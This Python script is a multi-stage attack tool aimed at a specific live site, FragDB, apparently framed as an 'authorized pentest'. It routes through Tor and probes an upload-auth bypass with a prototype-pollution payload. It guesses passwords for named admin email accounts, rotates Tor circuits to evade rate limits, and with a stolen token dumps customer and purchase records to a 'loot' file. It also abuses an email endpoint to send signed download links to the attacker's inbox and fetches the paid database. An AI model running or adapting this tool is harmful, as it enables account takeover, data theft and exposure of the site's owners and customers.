#!/usr/bin/env python3
"""
FragDB privesc chain (authorized pentest).

JSON POST /api/admin/{sample,database/upload} skips the 401 gate
(Content-Type: application/json) but multer never parses a file — you get
500 "Failed to upload …", NOT a write / RCE. Multipart still 401.

Real path after an admin token:
  POST /api/admin/database/test-update-email
  {"emails":[YOUR_INBOX], "withDownloadLink": true}
  → signed download_link mailed (vkaxz@me.com is the hardcoded test target).

This script:
  1) probes JSON-upload skip (expect 500)
  2) hidden password login  (POST /api/admin/auth/login) — 2 tries / IP
  3) invite accept oracle
  4) if BEARER or cookie lands: dump shared-files + fire test-update-email
  5) pull /api/public/download/{token}/file

Usage:
  python3 privesc_upload.py --via tor
  python3 privesc_upload.py --via onion --email YOU@inbox --pass-file pw.txt
  FRAGDB_ADMIN_TOKEN=sess_... python3 privesc_upload.py --via tor --grab
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

ONION = "http://fragdbnets4wmegxbnnalblwi4njo4dozmwdecz7kbbqi75m7ztervyd.onion"
CF = "https://fragdb.net"
SOCKS = "socks5h://127.0.0.1:9050"

ADMINS = [
    "vkaxz@me.com",
    "vkaxzzz@gmail.com",
    "fragdb@proton.me",
    "support@fragdb.net",
    "crusader45623@proton.me",
]

# already burned on this target — keep as last-resort, 2 shots / IP
DEFAULT_PW = [
    "1466688",
    "588012",
    "Vkaxz123!",
    "Fragdb2026!",
    "FragDB!2026",
    "admin",
    "password",
    "пароль",
]


def _socks_opener():
    try:
        import socks  # PySocks
        from sockshandler import SocksiPyHandler

        h = SocksiPyHandler(socks.SOCKS5, "127.0.0.1", 9050)
        return urllib.request.build_opener(h)
    except Exception:
        # curl fallback later
        return None


class Client:
    def __init__(self, base: str, via_socks: bool):
        self.base = base.rstrip("/")
        self.via_socks = via_socks
        self.opener = _socks_opener() if via_socks else urllib.request.build_opener()
        self.token: str | None = os.environ.get("FRAGDB_ADMIN_TOKEN") or None

    def req(
        self,
        method: str,
        path: str,
        data: Any = None,
        ct: str | None = "application/json",
        raw: bytes | None = None,
        timeout: int = 25,
    ) -> tuple[int, str]:
        url = path if path.startswith("http") else self.base + path
        body = raw
        headers = {"User-Agent": "Mozilla/5.0 (privesc)", "Accept": "application/json"}
        if self.token:
            headers["Authorization"] = "Bearer " + self.token
        if data is not None and body is None:
            body = json.dumps(data).encode()
            headers["Content-Type"] = ct or "application/json"
        elif ct:
            headers["Content-Type"] = ct
        if self.opener is None and self.via_socks:
            return self._curl(method, url, body, headers, timeout)
        req = urllib.request.Request(url, data=body, method=method, headers=headers)
        try:
            with self.opener.open(req, timeout=timeout) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    def _curl(self, method, url, body, headers, timeout):
        import subprocess
        import tempfile

        cmd = [
            "curl",
            "-sS",
            "--socks5-hostname",
            "127.0.0.1:9050",
            "--max-time",
            str(timeout),
            "-X",
            method,
            url,
            "-w",
            "\n__HTTP__%{http_code}",
        ]
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
        if body is not None:
            fd, p = tempfile.mkstemp()
            os.write(fd, body)
            os.close(fd)
            cmd += ["--data-binary", f"@{p}"]
        r = subprocess.run(cmd, capture_output=True, text=True)
        out = r.stdout
        if "__HTTP__" in out:
            body_s, code = out.rsplit("__HTTP__", 1)
            return int(code.strip() or 0), body_s
        return 0, (r.stderr or out)


def jload(s: str) -> Any:
    try:
        return json.loads(s)
    except Exception:
        return {"_raw": s[:400]}


def phase_json_skip(c: Client) -> None:
    print("\n[1] JSON upload skip (expect 500, NOT a write)")
    for path, payload in [
        ("/api/admin/sample", {"sample_file": "a,b\n"}),
        (
            "/api/admin/database/upload",
            {
                "db_code": "fragrantica",
                "version": "v9.9-privesc",
                "description": "x",
                "skip_notifications": "1",
            },
        ),
        (
            "/api/admin/database/upload",
            {"__proto__": {"isAdmin": True}, "db_code": "fragrantica"},
        ),
    ]:
        code, body = c.req("POST", path, payload)
        print(f"  {code} {path} {body[:120]}")


def phase_login(c: Client, emails: list[str], pws: list[str]) -> str | None:
    print("\n[2] hidden POST /api/admin/auth/login  (2 shots / IP — pick carefully)")
    shots = 0
    for em in emails:
        for pw in pws:
            if shots >= 2:
                print("  stop: 2 shots used this circuit")
                return c.token
            shots += 1
            code, body = c.req(
                "POST", "/api/admin/auth/login", {"email": em, "password": pw}
            )
            print(f"  {code} {em} / {pw!r} {body[:160]}")
            d = jload(body)
            tok = (
                d.get("token")
                or d.get("data", {}).get("token")
                or (d.get("data") or {}).get("accessToken")
            )
            if code == 200 and (d.get("success") or tok):
                c.token = tok or c.token
                print("  GOT TOKEN", (c.token or "")[:24])
                return c.token
            if "retryAfter" in body or "RATE_LIMIT" in body or code == 429:
                print("  rate-limited — rotate Tor (SIGNAL NEWNYM) and wait")
                return c.token
    return c.token


def phase_invite(c: Client) -> None:
    print("\n[3] invite accept")
    for tok in ["", "test", "a" * 32]:
        q = "/api/admin/invites/accept?token=" + urllib.parse.quote(tok)
        code, body = c.req("GET", q)
        print(f"  {code} token={tok[:16]!r} {body[:120]}")


def phase_grab(c: Client, inbox: str) -> None:
    print("\n[4] authenticated grab")
    if not c.token:
        print("  no admin token — skip (set FRAGDB_ADMIN_TOKEN or win step 2)")
        return
    for path in [
        "/api/store-admin/shared-files",
        "/api/admin/shared-files",
        "/api/admin/purchases?page=1&limit=5",
        "/api/admin/customers?page=1&limit=5",
        "/api/store-admin/email-templates",
    ]:
        code, body = c.req("GET", path)
        print(f"  {code} GET {path} {body[:200]}")
        d = jload(body)
        # pull downloadKey / downloadUrl / token
        blob = json.dumps(d)
        if "download" in blob.lower() or "token" in blob.lower():
            pathlib_dump = os.path.join(
                os.path.dirname(__file__) or ".", "loot_admin_dump.json"
            )
            with open(pathlib_dump, "a") as f:
                f.write(json.dumps({"path": path, "body": d}) + "\n")
            print("  saved snippet →", pathlib_dump)

    print("\n[5] test-update-email withDownloadLink →", inbox)
    code, body = c.req(
        "POST",
        "/api/admin/database/test-update-email",
        {
            "emails": [inbox],
            "withDownloadLink": True,
            "customSubject": "db",
            "customMessage": "x",
        },
    )
    print(f"  {code} {body[:300]}")

    code, body = c.req(
        "POST",
        "/api/admin/purchases/resend-link",
        {"downloadLinkId": 1},
    )
    print(f"  resend-link 1 → {code} {body[:200]}")


def pull_file(c: Client, token: str, out: str) -> None:
    print("\n[6] download", token)
    code, body = c.req("GET", f"/api/public/download/{token}")
    print(f"  meta {code} {body[:250]}")
    url = f"{c.base}/api/public/download/{urllib.parse.quote(token)}/file?sid=privesc"
    code, body = c.req("GET", url)
    if code == 200 and body[:2] == "PK" or (isinstance(body, str) and len(body) > 1000):
        with open(out, "wb") as f:
            f.write(body.encode("latin1", "replace"))
        print("  wrote", out, "bytes", os.path.getsize(out))
    else:
        print(f"  file {code} {body[:120]}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--via", choices=["tor", "onion"], default="tor")
    ap.add_argument("--email", default=os.environ.get("INBOX", "YOU@inbox.example"))
    ap.add_argument("--pass-file", help="one password per line; max 2 used / IP")
    ap.add_argument("--grab", action="store_true", help="skip login, use env token")
    ap.add_argument("--dl", help="public download token to fetch")
    args = ap.parse_args()

    base = ONION if args.via == "onion" else CF
    c = Client(base, via_socks=True)
    print("base", base, "token", (c.token or "-")[:16])

    phase_json_skip(c)
    phase_invite(c)

    pws = DEFAULT_PW
    if args.pass_file:
        pws = [
            ln.strip()
            for ln in open(args.pass_file)
            if ln.strip() and not ln.startswith("#")
        ]
    if not args.grab:
        phase_login(c, ADMINS, pws[:2])  # hard cap 2
    else:
        print("[2] skipped login (--grab)")

    phase_grab(c, args.email)
    if args.dl:
        pull_file(c, args.dl, os.path.join(os.path.dirname(__file__) or ".", "fragdb_database.zip"))

    print(
        """
---
JSON skip ≠ RCE. After a real sess_ token:

  curl --socks5-hostname 127.0.0.1:9050 -H "Authorization: Bearer sess_…" \\
    -H 'Content-Type: application/json' \\
    -d '{"emails":["INBOX"],"withDownloadLink":true}' \\
    https://fragdb.net/api/admin/database/test-update-email

Rotate Tor between login bursts:
  printf 'AUTHENTICATE\\r\\nSIGNAL NEWNYM\\r\\nQUIT\\r\\n' | nc 127.0.0.1 9051
"""
    )


if __name__ == "__main__":
    sys.exit(main() or 0)
